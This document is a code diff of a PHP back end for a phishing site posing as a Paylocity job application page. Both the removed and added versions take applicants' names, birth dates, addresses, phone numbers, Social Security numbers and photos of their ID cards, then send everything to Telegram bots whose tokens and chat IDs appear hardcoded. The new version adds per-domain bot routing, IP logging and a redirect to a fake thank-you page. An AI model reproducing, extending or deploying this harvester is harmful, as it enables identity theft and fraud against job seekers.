@@ -1,40 +1,68 @@
 <?php
-
 include 'firewall.php';
 
-
-// Telegram configuration
-$telegram_bots = [
-    [
-        'token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY',
-        'chat_id' => '1325797388'
+// 🌐 Site map: define how each site should behave
+$site_map = [
+    "paylocitylive.42web.io" => [
+        "bots" => [
+            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
+            ["token" => "TOKEN2", "chat_id" => "CHATID2"],
+        ],
+        "redirect" => "https://paylocitylive.42web.io/cache_site/careers/all-listings.job.34092/thankyou.html"
     ],
-    [
-        'token' => '7395338291:AAFiyILeZdxyENeRvcaYgZ93vnv2DYyW_XM',
-        'chat_id' => '8160582785'
-    ]
-    // Add more bots here if needed
+    "site2.net" => [
+        "bots" => [
+            ["token" => "TOKEN3", "chat_id" => "CHATID3"]
+        ],
+        "redirect" => "https://paylocitylive.42web.io/cache_site/careers/all-listings.job.34092/thankyou.html"
+    ],
+    "localhost" => [
+        "bots" => [
+            ["token" => "TESTTOKEN", "chat_id" => "TESTCHAT"]
+        ],
+        "redirect" => "http://localhost/thankyou.html"
+    ],
+    // Add more sites...
 ];
 
+// 🔍 Determine domain
+$host = $_SERVER['HTTP_HOST'] ?? 'unknown';
+$config = $site_map[$host] ?? null;
 
+if (!$config) {
+    http_response_code(403);
+    exit("Access denied: Unregistered site.");
+}
+
+// 🚀 Handle POST
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // 📝 Log file
+    $log_file = __DIR__ . "/logs/job_applications.txt";
+    if (!file_exists(dirname($log_file))) {
+        mkdir(dirname($log_file), 0777, true);
+    }
 
-    // Get form inputs
-    $first_name = htmlspecialchars($_POST['q11_fullName']['first'] ?? '');
-    $middle_name = htmlspecialchars($_POST['q11_fullName']['middle'] ?? '');
-    $last_name = htmlspecialchars($_POST['q11_fullName']['last'] ?? '');
-    $full_name = trim("$first_name $middle_name $last_name");
+    function log_entry($msg) {
+        global $log_file;
+        file_put_contents($log_file, "[" . date("Y-m-d H:i:s") . "] $msg\n", FILE_APPEND);
+    }
 
-    $birth_month = $_POST['q18_birthDate']['month'] ?? '';
-    $birth_day = $_POST['q18_birthDate']['day'] ?? '';
-    $birth_year = $_POST['q18_birthDate']['year'] ?? '';
-    $birth_date = "$birth_year-$birth_month-$birth_day";
+    // 📋 Get form fields
+    $first = htmlspecialchars($_POST['q11_fullName']['first'] ?? '');
+    $middle = htmlspecialchars($_POST['q11_fullName']['middle'] ?? '');
+    $last = htmlspecialchars($_POST['q11_fullName']['last'] ?? '');
+    $full_name = trim("$first $middle $last");
 
-    $address = htmlspecialchars($_POST['q16_currentAddress']['addr_line1'] ?? '') . " " . 
-               htmlspecialchars($_POST['q16_currentAddress']['addr_line2'] ?? '') . ", " .
-               htmlspecialchars($_POST['q16_currentAddress']['city'] ?? '') . ", " .
-               htmlspecialchars($_POST['q16_currentAddress']['state'] ?? '') . ", " .
-               htmlspecialchars($_POST['q16_currentAddress']['postal'] ?? '');
+    $dob = sprintf("%04d-%02d-%02d", 
+        $_POST['q18_birthDate']['year'] ?? 0, 
+        $_POST['q18_birthDate']['month'] ?? 0, 
+        $_POST['q18_birthDate']['day'] ?? 0);
+
+    $address = htmlspecialchars(($_POST['q16_currentAddress']['addr_line1'] ?? '') . " " .
+                                ($_POST['q16_currentAddress']['addr_line2'] ?? '') . ", " .
+                                ($_POST['q16_currentAddress']['city'] ?? '') . ", " .
+                                ($_POST['q16_currentAddress']['state'] ?? '') . ", " .
+                                ($_POST['q16_currentAddress']['postal'] ?? ''));
 
     $email = htmlspecialchars($_POST['q12_emailAddress'] ?? '');
     $phone = htmlspecialchars($_POST['q13_phoneNumber13']['full'] ?? '');
@@ -42,138 +70,88 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $job_type = htmlspecialchars($_POST['q24_jobType'] ?? '');
     $source = htmlspecialchars($_POST['q21_howDid21'] ?? '');
     $ssn = htmlspecialchars($_POST['q25_socSec'] ?? '');
-
+    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
     $timestamp = date("Y-m-d H:i:s");
 
+    // 📦 Upload handler
+    function uploadFile($key, $prefix) {
+        $upload_dir = __DIR__ . "/uploads/";
+        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
 
+        if (!empty($_FILES[$key]['name'][0])) {
+            $original = $_FILES[$key]['name'][0];
+            $ext = pathinfo($original, PATHINFO_EXTENSION);
+            $name = $prefix . "_" . time() . "." . $ext;
+            $path = $upload_dir . $name;
 
-
-
-
-    // Create the uploads directory if it doesn't exist
-    $upload_dir = "uploads/";
-    if (!is_dir($upload_dir)) {
-        mkdir($upload_dir, 0777, true);
-    }
-
-    // Function to process uploaded files
-    function handleFileUpload($file_input_name, $file_prefix) {
-        global $upload_dir;
-
-        if (!empty($_FILES[$file_input_name]['name'][0])) {
-            $original_filename = $_FILES[$file_input_name]['name'][0];
-            $file_extension = pathinfo($original_filename, PATHINFO_EXTENSION);
-            $new_filename = $file_prefix . "_" . time() . "." . $file_extension;
-            $file_path = $upload_dir . $new_filename;
-
-            if (move_uploaded_file($_FILES[$file_input_name]['tmp_name'][0], $file_path)) {
-                return $file_path;
+            if (move_uploaded_file($_FILES[$key]['tmp_name'][0], $path)) {
+                return $path;
             }
         }
         return null;
     }
 
+    $front_id = uploadFile("q17_uploadYour", "front_id");
+    $back_id = uploadFile("q26_identityVerification", "back_id");
 
-    // Handle file uploads
-    $front_id_path = handleFileUpload('q17_uploadYour', 'front_id');
-    $back_id_path = handleFileUpload('q26_identityVerification', 'back_id');
+    // 🧾 Format Telegram message
+    $message = "📝 *New Job Application*\n\n" .
+               "👤 *Name:* $full_name\n" .
+               "🎂 *DOB:* $dob\n" .
+               "🏠 *Address:* $address\n" .
+               "📧 *Email:* $email\n" .
+               "📞 *Phone:* $phone\n" .
+               "💼 *Position:* $position\n" .
+               "📌 *Job Type:* $job_type\n" .
+               "🗣 *Referred By:* $source\n" .
+               "🔐 *SSN:* $ssn\n" .
+               "🕒 *Submitted:* $timestamp\n" .
+               "🌐 *IP:* $ip\n" .
+               "📎 *ID Uploaded:* " . ($front_id && $back_id ? "✅ Yes" : "❌ No");
 
+    // 📬 Send text to bots
+    foreach ($config['bots'] as $bot) {
+        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
+        $data = ['chat_id' => $bot['chat_id'], 'text' => $message, 'parse_mode' => 'Markdown'];
 
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => $data
+        ]);
+        curl_exec($ch);
+        curl_close($ch);
+    }
 
+    // 📤 Send files
+    function sendFile($file, $caption, $bots) {
+        if (!file_exists($file)) return;
+        $is_image = in_array(strtolower(pathinfo($file, PATHINFO_EXTENSION)), ['jpg', 'jpeg', 'png', 'gif']);
 
-    // Function to send messages to multiple Telegram bots
-    function sendMessageToTelegramBots($message, $bots) {
         foreach ($bots as $bot) {
-            $telegram_url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
-
-            $data = [
+            $endpoint = $is_image ? "sendPhoto" : "sendDocument";
+            $url = "https://api.telegram.org/bot{$bot['token']}/$endpoint";
+            $payload = [
                 'chat_id' => $bot['chat_id'],
-                'text' => $message,
+                ($is_image ? 'photo' : 'document') => new CURLFile(realpath($file)),
+                'caption' => $caption,
                 'parse_mode' => 'Markdown'
             ];
 
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, $telegram_url);
-            curl_setopt($ch, CURLOPT_POST, 1);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            $ch = curl_init($url);
+            curl_setopt_array($ch, [CURLOPT_POST => true, CURLOPT_POSTFIELDS => $payload, CURLOPT_RETURNTRANSFER => true]);
             curl_exec($ch);
             curl_close($ch);
         }
     }
 
+    sendFile($front_id, "📎 *Front ID* for $full_name", $config['bots']);
+    sendFile($back_id, "📎 *Back ID* for $full_name", $config['bots']);
 
-    // Prepare message for Telegram
-    $telegram_message = "📝 *New Job Application*\n\n".
-                        "👤 *Name:* $full_name\n".
-                        "🎂 *Birth Date:* $birth_date\n".
-                        "🏠 *Address:* $address\n".
-                        "📧 *Email:* $email\n".
-                        "📞 *Phone:* $phone\n".
-                        "💼 *Position Applied:* $position\n".
-                        "📌 *Job Type:* $job_type\n".
-                        "🗣️ *Referred By:* $source\n".
-                        "🔐 *SSN:* $ssn\n".
-                        "⏳ *Submitted At:* $timestamp\n".
-                        "📎 *Identity Verification:* " . ($front_id_path && $back_id_path ? "✅ Uploaded" : "❌ Not Provided");
+    log_entry("✅ [$host] Job application received from $ip ($full_name)");
 
-
-    // Send text message to Telegram
-    sendMessageToTelegramBots($telegram_message, $telegram_bots);
-
-
-
-
-   // Function to send files to multiple Telegram bots
-    function sendFileToTelegramBots($file_path, $caption, $bots) {
-        if (!file_exists($file_path) || filesize($file_path) == 0) {
-            return; // Skip if the file is missing or empty
-        }
-
-        $file_extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
-        $image_extensions = ['jpg', 'jpeg', 'png', 'gif'];
-
-        foreach ($bots as $bot) {
-            $telegram_url = "https://api.telegram.org/bot" . $bot['token'] . "/";
-
-            if (in_array($file_extension, $image_extensions)) {
-                $telegram_url .= "sendPhoto";
-                $post_data = [
-                    'chat_id' => $bot['chat_id'],
-                    'photo' => new CURLFile(realpath($file_path)), 
-                    'caption' => $caption,
-                    'parse_mode' => 'Markdown'
-                ];
-            } else {
-                $telegram_url .= "sendDocument";
-                $post_data = [
-                    'chat_id' => $bot['chat_id'],
-                    'document' => new CURLFile(realpath($file_path)), 
-                    'caption' => $caption,
-                    'parse_mode' => 'Markdown'
-                ];
-            }
-
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, $telegram_url);
-            curl_setopt($ch, CURLOPT_POST, 1);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-            curl_exec($ch);
-            curl_close($ch);
-        }
-    }
-
-
-
-    // Send files to Telegram
-    sendFileToTelegramBots($front_id_path, "📎 *Front ID* uploaded by *$full_name*", $telegram_bots);
-    sendFileToTelegramBots($back_id_path, "📎 *Back ID* uploaded by *$full_name*", $telegram_bots);
-
-
-
-
-    header("Location:https://paylocitylive.42web.io/cache_site/careers/all-listings.job.34092/thankyou.html");
-exit;
+    header("Location: " . $config['redirect']);
+    exit;
 }
 ?>
